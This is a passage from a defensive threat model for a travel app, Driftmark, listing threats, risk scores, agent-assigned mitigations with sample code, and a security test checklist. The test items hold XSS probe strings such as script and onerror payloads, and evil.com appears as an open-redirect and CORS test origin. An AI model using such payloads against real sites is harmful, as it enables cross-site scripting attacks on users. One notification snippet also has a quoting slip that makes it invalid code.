The offline mutation queue (pending writes) stored in AsyncStorage contains unencrypted payloads including place names, ratings, review text, and budget data.

**T-08-C: Sensitive Data in Zustand Store Persisted to Disk**
If `zustand/middleware` persist is used with AsyncStorage as the backend, all store state (including user profile, group membership, ratings) is written to disk unencrypted.

**T-08-D: Application Log Files Containing User Data**
Metro bundler or production crash logs write sensitive data (API responses containing personal information) to device log files accessible by other apps with `READ_LOGS` permission on Android.

| Metric | Value |
|---|---|
| Likelihood | 2 |
| Impact | 4 |
| Risk Score | **8** |

#### Mitigations

**M-08-A** (Security Agent — `src/lib/auth.ts`): Replace AsyncStorage with `expo-secure-store` for all authentication tokens. Provide a Supabase client storage adapter:
```typescript
import * as SecureStore from 'expo-secure-store';
import AsyncStorage from '@react-native-async-storage/async-storage';
import { Platform } from 'react-native';

const secureStorage = {
  getItem: (key: string) => Platform.OS === 'web'
    ? Promise.resolve(sessionStorage.getItem(key))
    : SecureStore.getItemAsync(key),
  setItem: (key: string, value: string) => Platform.OS === 'web'
    ? Promise.resolve(sessionStorage.setItem(key, value))
    : SecureStore.setItemAsync(key, value),
  removeItem: (key: string) => Platform.OS === 'web'
    ? Promise.resolve(sessionStorage.removeItem(key))
    : SecureStore.deleteItemAsync(key),
};

export const supabase = createClient(SUPABASE_URL, SUPABASE_ANON_KEY, {
  auth: { storage: secureStorage, persistSession: true, autoRefreshToken: true }
});
```
Note: `expo-secure-store` values are encrypted via the platform keystore (Android Keystore / iOS Keychain). Maximum value size is 2048 bytes — sufficient for JWTs.

**M-08-B** (Backend Agent — `src/lib/offline.ts`): The offline queue must not store raw review text or budget figures in AsyncStorage. Store only operation descriptors (table name, operation type, resource ID) and re-fetch data from the DB on reconnect. If full payload caching is required for offline display, encrypt it using a device-local key stored in SecureStore.

**M-08-C** (Backend Agent — Zustand stores): Do NOT use Zustand persist middleware with AsyncStorage for stores containing personal data. Either (a) use no persistence and re-hydrate from API on mount, or (b) persist only non-sensitive UI state (e.g., selected tab, map zoom level) using AsyncStorage, and keep all user data in memory only.

**M-08-D** (DevOps Agent + Backend Agent): Disable verbose logging in production builds. Use a logging wrapper that gates all `console.log` / `console.debug` calls behind `__DEV__`. In `app.config.ts`, configure `console.log` stripping for the production bundle via `transform-remove-console` Babel plugin for production profiles.

---

### AS-09 Push Notifications

#### Threat Scenarios

**T-09-A: Expo Push Token Theft Enables Notification Hijacking**
Expo push tokens stored in the `push_tokens` table are accessible to other authenticated users via a missing RLS policy. An attacker harvests tokens and uses the Expo Push API directly (which does not require authentication) to send arbitrary notifications to any Driftmark user.

**T-09-B: Notification Content Leaks Private Data**
A push notification payload includes the full review text or place name of a private trip. If the device is locked and notifications display on the lock screen, anyone who can see the device screen reads private data.

**T-09-C: Notification Spoofing via SSRF on Edge Function**
The `send-push-notification` Edge Function accepts a `targetUserId` parameter. Without JWT validation, an attacker triggers the function with a crafted payload, causing arbitrary notifications to be sent to targeted users.

**T-09-D: Stale Token Accumulation**
A user uninstalls the app. Their Expo push token remains in the database. Sending notifications to invalid tokens generates noise and may trigger Expo rate limits affecting all users.

| Metric | Value |
|---|---|
| Likelihood | 2 |
| Impact | 3 |
| Risk Score | **6** |

#### Mitigations

**M-09-A** (Security Agent — RLS): `push_tokens` must be inaccessible to all users except the token owner AND the service-role key (for sending):
```sql
ALTER TABLE push_tokens ENABLE ROW LEVEL SECURITY;

CREATE POLICY "push_tokens_own_only"
  ON push_tokens FOR ALL
  USING (auth.uid() = user_id)
  WITH CHECK (auth.uid() = user_id);
-- The send-push-notification Edge Function uses service-role and bypasses RLS.
-- This is acceptable because it never exposes tokens to the client.
```
The `send-push-notification` Edge Function must NEVER return push tokens in its response.

**M-09-B** (Backend Agent — Edge Function): Notification payloads must contain minimal information. Use a "you have a new group update" pattern rather than embedding review text:
```typescript
// WRONG: leaks private content to lock screen
{ title: 'New review', body: review.text }

// CORRECT: generic notification, content fetched on tap
{ title: 'New group activity', body: 'Tap to see what's new in your group', data: { groupId } }
```

**M-09-C** (Security Agent): The `send-push-notification` Edge Function must call `requireAuth(req)` (from M-07-A) and verify the caller is a member of the group before sending notifications to other group members. Notifications are only sent to group members, triggered by `group_places` INSERT webhooks — the webhook payload's `user_id` must match the JWT.

**M-09-D** (Backend Agent — `src/services/notifications.ts`): Handle `DeviceNotRegistered` and `InvalidCredentials` error responses from the Expo Push API by deleting the stale token from `push_tokens`. Implement this cleanup in the Edge Function response handler:
```typescript
for (const ticket of tickets) {
  if (ticket.status === 'error' && ticket.details?.error === 'DeviceNotRegistered') {
    await supabaseAdmin.from('push_tokens').delete().eq('expo_push_token', token);
  }
}
```

---

### AS-10 Sharing Features & Deep Links

#### Threat Scenarios

**T-10-A: Deep Link Hijacking on Android**
Android allows any app to register as a handler for custom URL schemes (e.g., `driftmark://`). A malicious app can declare itself as a handler for `driftmark://` and receive invite codes or authentication tokens passed via deep links.

**T-10-B: Open Redirect via Share Card URL Parameter**
A share card URL like `https://driftmark.app/share?redirect=https://evil.com` could redirect users to phishing sites if the redirect parameter is not validated.

**T-10-C: Unauthenticated Access to Share Card Data**
The `share-cards` Supabase Storage bucket is public. If share cards contain private data (full ratings breakdown, budget information), that data is accessible to anyone with the URL, even without authentication.

**T-10-D: Share Card URL Enumeration**
Share card URLs with predictable names (e.g., `share-cards/${userId}/latest.png`) allow any user to view another user's share card by guessing the URL.

| Metric | Value |
|---|---|
| Likelihood | 2 |
| Impact | 3 |
| Risk Score | **6** |

#### Mitigations

**M-10-A** (DevOps Agent — `app.config.ts`): Use App Links (Android) and Universal Links (iOS) instead of custom URL schemes for security-sensitive deep links. App Links require a verified domain association (`/.well-known/assetlinks.json`), preventing other apps from intercepting them. Configure in `app.config.ts`:
```typescript
intentFilters: [{
  action: 'VIEW',
  autoVerify: true,
  data: [{ scheme: 'https', host: 'driftmark.app', pathPrefix: '/group/join' }],
  category: ['BROWSABLE', 'DEFAULT'],
}]
```
Keep `driftmark://` scheme only for non-security-sensitive navigation (e.g., opening a specific tab).

**M-10-B** (UI Agent + Backend Agent): Never implement redirect parameters in any URL. The `getShareCardData` function returns data; the client constructs the UI. There are no redirect URLs in the application architecture. If any `redirect` or `return_to` parameter is ever added, it must be validated against a strict allowlist of the app's own domains.

**M-10-C** (Security Agent + Backend Agent — `src/services/sharing.ts`): Share cards must only contain data the user has explicitly chosen to share. Use a separate `getPublicShareData` function that returns only non-sensitive fields (country name, overall score, visit count). Never include budget, daily spend, or detailed category breakdowns in share card data. Store share cards in the `share-cards` bucket with a TTL:
```typescript
// Generate share card URL with 7-day expiry signed URL
const { data } = await supabase.storage
  .from('share-cards')
  .createSignedUrl(path, 604800); // 7 days
```

**M-10-D** (Security Agent + Backend Agent): Share card storage paths must include a cryptographically random component:
`share-cards/${userId}/${randomHex(16)}.png`
This prevents enumeration. The signed URL (from M-10-C) provides time-limited access.

---

### AS-11 Rate Limiting & Abuse Prevention

#### Threat Scenarios

**T-11-A: Storage Cost Inflation via Bulk Photo Upload**
A user writes a script that calls the upload endpoint in a loop, uploading thousands of photos and exhausting Supabase Storage quota at the project owner's cost.

**T-11-B: API Abuse for Competitor Intelligence**
A competitor scrapes all public profiles and aggregate ratings data using the Supabase REST API with the public anon key, which is exposed in the client bundle.

**T-11-C: Review Flooding**
A user submits hundreds of reviews for the same city, inflating their review count and polluting the group view.

**T-11-D: Account Creation Spam**
Automated Google OAuth account creation (using Google's testing accounts) to create hundreds of Driftmark accounts for various abusive purposes.

| Metric | Value |
|---|---|
| Likelihood | 3 |
| Impact | 3 |
| Risk Score | **9** |

#### Mitigations

**M-11-A** (Security Agent — `supabase/functions/rate-limit/`): Implement a rate-limiting Edge Function using Upstash Redis or Supabase's own KV store. Apply to all write operations: **20 writes per minute per user**, **60 reads per minute per user**. Implement using a sliding window counter keyed on `user_id`:
```typescript
// supabase/functions/_shared/rateLimit.ts
export async function checkRateLimit(
  userId: string,
  operation: 'read' | 'write',
  redis: Redis
): Promise<void> {
  const key = `rl:${userId}:${operation}:${Math.floor(Date.now() / 60000)}`;
  const limit = operation === 'read' ? 60 : 20;
  const count = await redis.incr(key);
  if (count === 1) await redis.expire(key, 120); // 2-minute TTL
  if (count > limit) {
    throw new Response('Rate limit exceeded', {
      status: 429,
      headers: { 'Retry-After': '60' }
    });
  }
}
```

**M-11-B** (Security Agent + Backend Agent): The Supabase anon key being public is by design — it is a publishable key with no inherent authority. Authorization is enforced by RLS (see AS-02). To prevent bulk scraping, enable Supabase's built-in request rate limiting in the Supabase dashboard (Settings > API > Rate Limiting): set to 100 requests per second per IP for the REST API.

**M-11-C** (Security Agent — RLS + DB constraint): Enforce uniqueness of `(user_id, city_id)` in `visited_places` at the database level:
```sql
ALTER TABLE visited_places
  ADD CONSTRAINT unique_user_city UNIQUE (user_id, city_id);
```
For country-level entries: `ADD CONSTRAINT unique_user_country_null_city UNIQUE (user_id, country_code) WHERE city_id IS NULL;`
This prevents review flooding at the data model level.

**M-11-D** (DevOps Agent): Configure Supabase Auth to limit sign-ups with disposable email providers. Enable CAPTCHA on the sign-in/sign-up flows via Supabase Auth's hCaptcha or Cloudflare Turnstile integration. Google OAuth accounts have a higher creation friction than email, which provides some natural spam resistance.

---

### AS-12 GDPR & Data Privacy

#### Threat Scenarios

**T-12-A: Account Deletion Leaves Orphaned Data**
A user requests account deletion. The `profiles` row is deleted, but rows in `visited_places`, `place_ratings`, `place_photos`, `group_members`, `push_tokens`, `achievements`, and Supabase Storage files remain. This orphaned data violates GDPR Article 17 (Right to Erasure).

**T-12-B: Data Export Incomplete or Malformed**
A user requests a data export (GDPR Article 20 — Data Portability). The export function omits `place_photos` storage URLs, group history, or rating breakdowns, making the export non-compliant.

**T-12-C: Residual Data in Backups**
Even after deletion, data persists in Supabase's automated backups (retained for 7-30 days depending on plan). This is a known limitation but must be documented.

**T-12-D: Cross-Border Data Transfer Without Adequacy**
Supabase stores data in AWS regions. If users are in the EU and data is stored in `us-east-1`, this is a cross-border transfer. Without an adequacy decision or SCCs, this may violate GDPR Chapter V.

| Metric | Value |
|---|---|
| Likelihood | 2 |
| Impact | 4 |
| Risk Score | **8** |

#### Mitigations

**M-12-A** (Security Agent — `supabase/migrations/XXX_delete_account.sql`): Implement account deletion as a single database function that cascades to all related data and deletes Storage files:
```sql
CREATE OR REPLACE FUNCTION delete_user_account(p_user_id UUID)
RETURNS VOID
LANGUAGE plpgsql
SECURITY DEFINER
SET search_path = public
AS $$
DECLARE
  v_photo_path TEXT;
BEGIN
  -- Verify caller is the account owner
  IF auth.uid() != p_user_id THEN
    RAISE EXCEPTION 'unauthorized';
  END IF;

  -- Collect storage paths before deletion
  FOR v_photo_path IN
    SELECT storage_path FROM place_photos WHERE user_id = p_user_id
  LOOP
    -- Storage deletion handled by Edge Function (SQL can't call HTTP)
    INSERT INTO pending_storage_deletions (path, bucket) VALUES (v_photo_path, 'place-photos');
  END LOOP;

  -- Cascade delete all user data
  DELETE FROM push_tokens WHERE user_id = p_user_id;
  DELETE FROM achievements WHERE user_id = p_user_id;
  DELETE FROM place_photos WHERE user_id = p_user_id;
  DELETE FROM place_ratings WHERE visited_place_id IN (
    SELECT id FROM visited_places WHERE user_id = p_user_id
  );
  DELETE FROM visited_places WHERE user_id = p_user_id;
  DELETE FROM group_members WHERE user_id = p_user_id;
  DELETE FROM group_places WHERE user_id = p_user_id;
  DELETE FROM profiles WHERE id = p_user_id;

  -- Delete the auth user (requires service role — call from Edge Function)
END;
$$;
```
The `settings/deleteAccount` screen must call a `delete-account` Edge Function that: (1) calls this SQL function, (2) deletes all Storage objects from the `pending_storage_deletions` queue, (3) calls `supabase.auth.admin.deleteUser(userId)`.

**M-12-B** (Security Agent — `supabase/migrations/XXX_export_data.sql`): Implement a comprehensive data export function that returns all user data as JSON:
```sql
CREATE OR REPLACE FUNCTION export_user_data(p_user_id UUID)
RETURNS JSONB
LANGUAGE plpgsql
SECURITY DEFINER AS $$
BEGIN
  IF auth.uid() != p_user_id THEN RAISE EXCEPTION 'unauthorized'; END IF;
  RETURN jsonb_build_object(
    'profile', (SELECT row_to_json(p) FROM profiles p WHERE id = p_user_id),
    'visited_places', (SELECT jsonb_agg(vp) FROM visited_places vp WHERE user_id = p_user_id),
    'ratings', (SELECT jsonb_agg(pr) FROM place_ratings pr
                JOIN visited_places vp ON pr.visited_place_id = vp.id
                WHERE vp.user_id = p_user_id),
    'photos', (SELECT jsonb_agg(pp) FROM place_photos pp WHERE user_id = p_user_id),
    'achievements', (SELECT jsonb_agg(a) FROM achievements a WHERE user_id = p_user_id),
    'groups', (SELECT jsonb_agg(g) FROM groups g
               JOIN group_members gm ON g.id = gm.group_id
               WHERE gm.user_id = p_user_id),
    'exported_at', now()
  );
END;
$$;
```

**M-12-C** (DevOps Agent — `docs/DEPLOYMENT.md`): Document Supabase's backup retention policy. Include in the app's Privacy Policy that "deleted data may persist in encrypted backups for up to 30 days." Configure Supabase to use the EU region (`eu-west-1` or `eu-central-1`) if the primary user base is European, or configure Point-in-Time Recovery with the minimum required retention window.

**M-12-D** (DevOps Agent): Select the Supabase project region to match the primary user base. Document this choice in `docs/DEPLOYMENT.md` alongside the legal basis for data processing. If EU users are expected, use `eu-central-1` (Frankfurt). Add a region selection notice to the Privacy Policy.

---

### AS-13 Web-Specific Risks

#### Threat Scenarios

**T-13-A: Clickjacking via iframe Embedding**
An attacker embeds `https://driftmark.app` in an iframe on a malicious page, overlays transparent UI elements, and tricks the victim into clicking "Leave Group" or "Delete Account" without knowing it.

**T-13-B: Cross-Site Request Forgery (CSRF)**
Without CSRF protection, a malicious site can trigger Supabase API calls using the victim's session cookies (if cookies are used for auth) via cross-origin form submissions or fetch requests.

**T-13-C: Missing Content Security Policy Allows XSS Escalation**
Without a CSP, a stored XSS payload (from AS-06) can load external scripts, exfiltrate data to attacker-controlled servers, and establish persistent access.

**T-13-D: Sensitive Data in Browser History / Referrer Headers**
Auth tokens, invite codes, or personal data embedded in URLs appear in browser history and are sent in `Referer` headers to third-party analytics or CDN scripts.

**T-13-E: HTTPS Downgrade / MITM**
Without HSTS, a network-level attacker can intercept HTTP responses and inject malicious content before the browser upgrades to HTTPS.

| Metric | Value |
|---|---|
| Likelihood | 3 |
| Impact | 4 |
| Risk Score | **12** |

#### Mitigations

**M-13-A** (DevOps Agent — `vercel.json`): Configure all security headers via Vercel response headers. The `vercel.json` headers configuration must include:
```json
{
  "headers": [
    {
      "source": "/(.*)",
      "headers": [
        {
          "key": "Strict-Transport-Security",
          "value": "max-age=63072000; includeSubDomains; preload"
        },
        {
          "key": "X-Frame-Options",
          "value": "DENY"
        },
        {
          "key": "X-Content-Type-Options",
          "value": "nosniff"
        },
        {
          "key": "Referrer-Policy",
          "value": "strict-origin-when-cross-origin"
        },
        {
          "key": "Permissions-Policy",
          "value": "camera=(), microphone=(), geolocation=(), interest-cohort=()"
        },
        {
          "key": "Content-Security-Policy",
          "value": "default-src 'self'; script-src 'self' 'nonce-{NONCE}'; style-src 'self' 'unsafe-inline'; img-src 'self' data: https://*.supabase.co blob:; connect-src 'self' https://*.supabase.co wss://*.supabase.co https://oauth2.googleapis.com; frame-ancestors 'none'; base-uri 'self'; form-action 'self';"
        }
      ]
    }
  ]
}
```
Note: `'unsafe-inline'` for styles is acceptable for React Native Web inline styles. Work towards eliminating it progressively. The nonce-based CSP for scripts requires server-side rendering integration — if using static export, use a hash-based CSP instead.

**M-13-B** (Security Agent): Supabase Auth uses Bearer tokens (not session cookies) by default. CSRF via cookie-based auth is therefore not applicable. Do not switch to cookie-based auth unless explicitly required. If `httpOnly` cookies are implemented later, add `SameSite=Strict` and `__Host-` prefix to all auth cookies.

**M-13-C** (DevOps Agent): The CSP in M-13-A includes `connect-src` restrictions that prevent exfiltration to attacker-controlled domains. Ensure that no inline `<script>` tags are present in the web build — all JS must be bundled. Add a CI check that fails the build if any `<script src=` tag points to an external domain not in the CSP allowlist.

**M-13-D** (DevOps Agent + UI Agent): Set `Referrer-Policy: strict-origin-when-cross-origin` (included in M-13-A). Ensure invite codes and auth tokens are never in query parameters (covered in M-05-E and M-01-D). Never load third-party analytics scripts that are not included in the CSP `connect-src` allowlist.

**M-13-E**: Covered by `Strict-Transport-Security` header in M-13-A with `max-age=63072000` (2 years). Submit `driftmark.app` to the HSTS preload list at https://hstspreload.org after launch.

---

### AS-14 Mobile-Specific Risks

#### Threat Scenarios

**T-14-A: Deep Link Hijacking via Custom URL Scheme**
On Android, multiple apps can register the same custom URL scheme (`driftmark://`). A malicious app with the same scheme installed on the same device intercepts invite codes or OAuth redirect codes.

**T-14-B: Sensitive Data Exposed in App Backgrounding Screenshots**
iOS and Android capture screenshots of the app when it moves to background (for the app switcher). These screenshots may contain ratings, trip plans, or group data and are stored on-device.

**T-14-C: Debug Build Leaks Secrets**
A debug build submitted to TestFlight or sideloaded has logging enabled, bundle source maps accessible, and potentially hardcoded API keys or development Supabase URLs.

**T-14-D: Certificate Pinning Bypass on Rooted Devices**
Without certificate pinning, an attacker on a rooted device can install a custom root CA and proxy all API traffic, reading decrypted requests and responses including JWTs and user data.

**T-14-E: Clipboard Leakage of Invite Codes**
An invite code copied to the clipboard by the "Copy Invite Link" feature persists in the clipboard indefinitely. Other apps with clipboard access can read it.

| Metric | Value |
|---|---|
| Likelihood | 2 |
| Impact | 3 |
| Risk Score | **6** |

#### Mitigations

**M-14-A** (DevOps Agent — `app.config.ts`): As covered in M-10-A, use Android App Links / iOS Universal Links for invite and auth deep links. These are domain-verified and cannot be hijacked by other apps. The `driftmark://` custom scheme can remain for non-sensitive navigation (e.g., opening the groups tab).

**M-14-B** (UI Agent — App lifecycle): Obscure the app content when backgrounded using `expo-screen-capture`:
```typescript
import * as ScreenCapture from 'expo-screen-capture';
import { AppState } from 'react-native';

// In the root _layout.tsx:
useEffect(() => {
  const sub = AppState.addEventListener('change', (state) => {
    if (state === 'background' || state === 'inactive') {
      ScreenCapture.preventScreenCaptureAsync();
    } else {
      ScreenCapture.allowScreenCaptureAsync();
    }
  });
  return () => sub.remove();
}, []);
```
This prevents the OS from capturing sensitive content in the app switcher screenshot.

**M-14-C** (DevOps Agent — `eas.json` + `app.config.ts`): Ensure production and preview EAS profiles set `"distribution": "store"` and `"env": "production"`. Strip `console.*` in production via Babel plugin. Verify that `.env.production` is never committed — use EAS secrets for all production values. Add a pre-build check in CI that scans for hardcoded strings matching Supabase URL patterns or API key patterns.

**M-14-D** (DevOps Agent): Certificate pinning via Expo is not straightforward and creates app update friction (pins must be updated when certs rotate). Given that the Supabase JWT provides the primary security layer (short-lived, validated server-side), certificate pinning is NOT required for the initial release but should be evaluated for the 1.0 release. Document this as a known risk. Ensure certificate pinning is on the post-launch security roadmap.

**M-14-E** (UI Agent): When the "Copy Invite Link" function is called, use a short clipboard timeout. On iOS 16+, set a UIPasteboard expiry:
```typescript
import * as Clipboard from 'expo-clipboard';

export async function copyInviteLink(code: string): Promise<void> {
  await Clipboard.setStringAsync(`https://driftmark.app/group/join/${code}`);
  // Clear clipboard after 60 seconds
  setTimeout(() => Clipboard.setStringAsync(''), 60_000);
}
```

---

## 4. Security Constraints

These rules are MANDATORY for ALL agents. No pull request that violates these constraints will be merged.

### 4.1 Authentication Requirements

| Rule | Enforcement |
|---|---|
| Every request to an Edge Function must include a valid `Authorization: Bearer <jwt>` header | Security Agent middleware (`requireAuth`) — blocks with 401 if absent |
| Sessions expire after 30 days of inactivity | Configured in Supabase Auth dashboard — `REFRESH_TOKEN_ROTATION_ENABLED=true`, `REFRESH_TOKEN_REUSE_INTERVAL=0` |
| JWTs must never be stored in `localStorage` on web | ESLint rule: flag any `localStorage.setItem` containing `token` or `session` |
| All token storage on native must use `expo-secure-store` | Code review requirement — no `AsyncStorage` usage for auth tokens |
| Google OAuth must use Supabase's built-in provider flow — no custom OAuth implementation | Architecture constraint — no `googleapis` or `google-auth-library` packages in package.json |
| Auto-logout must trigger after 30 days of inactivity | Implemented in `src/lib/auth.ts` via Supabase Auth `onAuthStateChange` listener |

### 4.2 Input Validation Requirements

| Rule | Enforcement |
|---|---|
| Every user-facing form field must have a corresponding Zod schema in `src/lib/validation.ts` | Backend Agent: import and parse schemas before any DB write. Test Agent: verify Zod parse is called in service functions |
| All string inputs must be sanitized with `sanitizeText()` before storage | Security Agent provides `src/lib/sanitize.ts` — Backend Agent must import it |
| Ratings must be integers in range [1, 5] | Zod: `z.number().int().min(1).max(5)` |
| Country codes must match ISO 3166-1 alpha-2 | Zod: `z.string().length(2).regex(/^[A-Z]{2}$/)` validated against the `countries.ts` constant |
| Currency codes must match ISO 4217 | Zod: `z.string().length(3).regex(/^[A-Z]{3}$/)` validated against a curated allowlist |
| File type validation must check magic bytes — MIME type header alone is NOT sufficient | `validateImageMagicBytes()` in `src/lib/photoSecurity.ts` |
| Budget values must be positive numbers ≤ 999,999 | Zod: `z.number().positive().max(999999)` |

### 4.3 Data Handling Requirements

| Rule | Enforcement |
|---|---|
| RLS must be ENABLED on every user-data table | Migration linting: CI job that queries `pg_tables` and fails if any table has `rowsecurity = false` |
| EVERY EXIF GPS field must be stripped before upload — failure to strip blocks the upload | `stripExifAndCompress()` must be called and must throw if GPS data remains |
| No `SELECT *` — always specify columns | ESLint rule: flag `.select('*')` in Supabase queries |
| No orphaned data after account deletion — verified by test | Test Agent: write a test that creates a full account, triggers deletion, and verifies zero rows remain in all user tables |
| Invite codes expire after exactly 7 days and are single-use | DB trigger: `invite_expires_at = created_at + INTERVAL '7 days'`. Join function nullifies code after use |
| Share cards must not contain budget or daily spend data | `getPublicShareData()` schema enforces this — Code review |
| Push notification payloads must not contain personal data | Edge Function code review — payloads contain only `groupId` and a generic message |

### 4.4 Secrets Management Requirements

| Rule | Enforcement |
|---|---|
| No secrets in source code — ever | `git-secrets` pre-commit hook. CI: `truffleHog` scan on every PR |
| Supabase service-role key must NEVER be included in the client bundle | Webpack/Metro bundle analysis in CI — fail if `service_role` string appears in bundle |
| All production secrets must be EAS secrets or Vercel environment variables | DevOps Agent — no `.env.production` file in the repository |
| `.env.example` must document all required variables without real values | DevOps Agent responsibility |
| Supabase anon key is a publishable key — it is SAFE to include in the client bundle | Documented to avoid confusion — anon key has no authority without valid JWT |
| Log scrubbing must redact JWT patterns before any external transmission | Logger wrapper in `src/lib/logger.ts` — mandatory import in all service files |

---

## 5. Testing Requirements

The following security tests must pass before the application ships. The Test Agent is responsible for implementing these tests. The Security Agent is responsible for their content and assertions.

### 5.1 Authentication Tests (`__tests__/unit/auth.test.ts`)

- [ ] **T-AUTH-01**: Supabase client initialized with `expo-secure-store` adapter — verify `AsyncStorage` is NOT used for session
- [ ] **T-AUTH-02**: Sign-out calls `supabase.auth.signOut()` and clears all stored tokens
- [ ] **T-AUTH-03**: `requireAuth()` returns 401 when no Authorization header is present
- [ ] **T-AUTH-04**: `requireAuth()` returns 401 when Authorization header contains an expired JWT
- [ ] **T-AUTH-05**: `requireAuth()` returns 401 when Authorization header contains a malformed token
- [ ] **T-AUTH-06**: `requireAuth()` returns `{ userId, client }` when a valid JWT is provided

### 5.2 RLS Policy Tests (`__tests__/integration/rls.test.ts`)

- [ ] **T-RLS-01**: User A cannot SELECT rows from `visited_places` owned by User B
- [ ] **T-RLS-02**: User A cannot INSERT into `visited_places` with `user_id = User B's ID`
- [ ] **T-RLS-03**: User A cannot SELECT from `place_ratings` for a visited place owned by User B
- [ ] **T-RLS-04**: Non-member cannot SELECT from `group_places` for Group X
- [ ] **T-RLS-05**: Any authenticated user CAN SELECT from `cities` (read-only reference table)
- [ ] **T-RLS-06**: No user can INSERT/UPDATE/DELETE in `cities`
- [ ] **T-RLS-07**: No user can INSERT directly into `achievements`
- [ ] **T-RLS-08**: User A cannot SELECT `push_tokens` owned by User B
- [ ] **T-RLS-09**: Storage policy rejects upload to path not starting with `{user_id}/`
- [ ] **T-RLS-10**: Storage policy rejects access to another user's `place-photos` files

### 5.3 Input Validation Tests (`__tests__/unit/validation.test.ts`)

- [ ] **T-VAL-01**: `ReviewSchema.parse('<script>alert(1)</script>')` strips the script tag and returns plain text
- [ ] **T-VAL-02**: `ReviewSchema.parse('a'.repeat(2001))` throws a Zod validation error
- [ ] **T-VAL-03**: `DisplayNameSchema.parse('<img src=x>')` returns text with no HTML
- [ ] **T-VAL-04**: `DisplayNameSchema.parse('а'.repeat(30))` where `а` = U+0430 mixed with Latin — must reject mixed-script names
- [ ] **T-VAL-05**: Rating schema rejects `0`, `6`, `-1`, `1.5`, and `"5"`
- [ ] **T-VAL-06**: Country code schema rejects `"XX"`, `"gb"` (lowercase), `"GBR"` (3-char)
- [ ] **T-VAL-07**: Budget schema rejects negative numbers and values > 999,999
- [ ] **T-VAL-08**: Currency code schema rejects `"US"` (2-char) and `"usd"` (lowercase)

### 5.4 Photo Security Tests (`__tests__/unit/photoSecurity.test.ts`)

- [ ] **T-PHOTO-01**: `stripExifAndCompress()` on a JPEG with GPS coordinates returns a file with no GPS EXIF data
- [ ] **T-PHOTO-02**: `stripExifAndCompress()` throws if GPS data cannot be removed
- [ ] **T-PHOTO-03**: `validateImageMagicBytes()` accepts valid JPEG, PNG, and WebP files
- [ ] **T-PHOTO-04**: `validateImageMagicBytes()` rejects a `.jpg` file with an SVG magic byte signature
- [ ] **T-PHOTO-05**: `validateImageMagicBytes()` rejects a PHP file renamed to `.jpg`
- [ ] **T-PHOTO-06**: Upload is blocked for files > 5MB before EXIF stripping
- [ ] **T-PHOTO-07**: Post-compression file size is < 1MB

### 5.5 Sanitization Tests (`__tests__/unit/sanitize.test.ts`)

- [ ] **T-SAN-01**: `sanitizeText('<script>alert(1)</script>')` returns `''`
- [ ] **T-SAN-02**: `sanitizeText('<img src=x onerror=alert(1)>')` returns `''`
- [ ] **T-SAN-03**: `sanitizeText('Hello <b>World</b>')` returns `'Hello World'`
- [ ] **T-SAN-04**: `sanitizeText('Normal text')` returns `'Normal text'` unchanged
- [ ] **T-SAN-05**: `sanitizeText('alert("xss")')` (no HTML tags) returns the string unchanged

### 5.6 Rate Limiting Tests (`__tests__/integration/rateLimit.test.ts`)

- [ ] **T-RATE-01**: 21 write requests within 60 seconds from the same user ID returns HTTP 429 on the 21st
- [ ] **T-RATE-02**: 61 read requests within 60 seconds from the same user ID returns HTTP 429 on the 61st
- [ ] **T-RATE-03**: Rate limit counter resets after the 60-second window

### 5.7 Group Invite Tests (`__tests__/integration/invite.test.ts`)

- [ ] **T-INV-01**: An invite code older than 7 days returns a 410 Gone response
- [ ] **T-INV-02**: An invite code used by one user is invalidated and cannot be used by a second user
- [ ] **T-INV-03**: A fifth user attempting to join a 4-member group via a valid invite code receives an error
- [ ] **T-INV-04**: Invite code hash is not exposed in any API response
- [ ] **T-INV-05**: The join flow rejects the request if the JWT user is already a member of the group

### 5.8 Account Deletion Tests (`__tests__/integration/deletion.test.ts`)

- [ ] **T-DEL-01**: After `delete_user_account()`, zero rows remain in `visited_places` for that user
- [ ] **T-DEL-02**: After `delete_user_account()`, zero rows remain in `place_ratings` for that user's places
- [ ] **T-DEL-03**: After `delete_user_account()`, zero rows remain in `place_photos` for that user
- [ ] **T-DEL-04**: After `delete_user_account()`, zero rows remain in `push_tokens` for that user
- [ ] **T-DEL-05**: After `delete_user_account()`, zero rows remain in `achievements` for that user
- [ ] **T-DEL-06**: After `delete_user_account()`, zero rows remain in `group_members` for that user
- [ ] **T-DEL-07**: After `delete_user_account()`, the Supabase Auth user record is deleted
- [ ] **T-DEL-08**: After `delete_user_account()`, Storage objects in `place-photos/${userId}/` are deleted

### 5.9 Web Security Header Tests (`__tests__/e2e/headers.test.ts`)

- [ ] **T-WEB-01**: Response includes `Strict-Transport-Security: max-age=63072000; includeSubDomains; preload`
- [ ] **T-WEB-02**: Response includes `X-Frame-Options: DENY`
- [ ] **T-WEB-03**: Response includes `X-Content-Type-Options: nosniff`
- [ ] **T-WEB-04**: Response includes `Content-Security-Policy` header with `frame-ancestors 'none'`
- [ ] **T-WEB-05**: Response includes `Referrer-Policy: strict-origin-when-cross-origin`
- [ ] **T-WEB-06**: HTTP request to `http://driftmark.app` redirects to `https://driftmark.app` with 301

### 5.10 CORS Tests (`__tests__/integration/cors.test.ts`)

- [ ] **T-CORS-01**: OPTIONS preflight to Edge Function from `https://driftmark.app` returns `Access-Control-Allow-Origin: https://driftmark.app`
- [ ] **T-CORS-02**: OPTIONS preflight from `https://evil.com` does NOT return `Access-Control-Allow-Origin: https://evil.com`
- [ ] **T-CORS-03**: Edge Function does not return `Access-Control-Allow-Origin: *`

---

*End of Threat Model v1.0*

*Next review: After Phase 1 implementation is complete. Security Agent must re-audit all mitigations against the actual codebase before any public release.*
